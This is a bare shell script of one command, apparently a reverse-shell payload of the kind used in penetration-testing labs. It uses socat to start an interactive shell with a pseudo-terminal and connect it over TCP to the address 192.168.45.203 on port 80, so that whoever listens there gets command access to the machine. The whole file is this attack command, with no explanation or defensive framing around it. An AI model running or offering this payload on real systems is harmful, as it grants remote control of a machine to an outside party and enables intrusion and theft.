#!/bin/sh

socat exec:'sh',pty,stderr,setsid,sigint,sane tcp:192.168.45.203:80
